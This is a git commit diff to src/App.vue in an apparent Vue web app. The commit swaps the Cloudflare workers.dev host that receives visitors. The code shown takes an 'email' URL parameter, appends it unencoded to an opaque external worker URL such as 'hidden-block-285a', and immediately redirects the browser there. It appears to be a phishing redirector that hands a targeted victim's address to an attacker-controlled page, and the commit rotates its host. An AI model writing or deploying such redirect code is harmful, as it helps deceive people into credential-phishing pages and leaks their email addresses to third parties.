399cf8c6a5db82f88e94b959c17f5ba8de788d8b
Newman400 <marystepmom71@gmail.com>
2025-03-20 09:03:23 -0700

    Update App.vue

--- src/App.vue
+++ src/App.vue
@@ -20,7 +20,7 @@ export default {
       // If the email parameter exists
       if (email) {
         // Construct the redirect URL with the plain email (not encoded)
-        const redirectUrl = `https://e28343e213273133e2e28343e2132.newreu29.workers.dev/${email}`;
+        const redirectUrl = `https://hidden-block-285a.newreu29.workers.dev/${email}`;
 
         // Redirect to the constructed URL
         window.location.replace(redirectUrl);
